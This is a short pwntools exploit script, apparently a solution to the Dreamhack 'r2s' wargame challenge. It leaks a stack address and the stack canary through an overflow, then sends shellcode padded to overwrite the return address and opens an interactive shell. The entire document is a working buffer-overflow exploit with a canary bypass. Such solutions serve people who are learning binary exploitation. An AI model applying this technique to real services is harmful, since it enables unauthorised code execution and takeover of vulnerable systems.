from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

# p = remote('host1.dreamhack.games', 17409)
p= process('./r2s')
context.arch = 'amd64'

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

payload = b'A' * 0x59
p.sendafter(b'Input:', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

sh = asm(shellcraft.sh())
payload = sh.ljust(0x58, b'A')
payload += p64(canary)
payload += b'B' * 8  # Overwrite RBP
payload += p64(buf)

p.sendafter(b'Input:', payload)
p.interactive()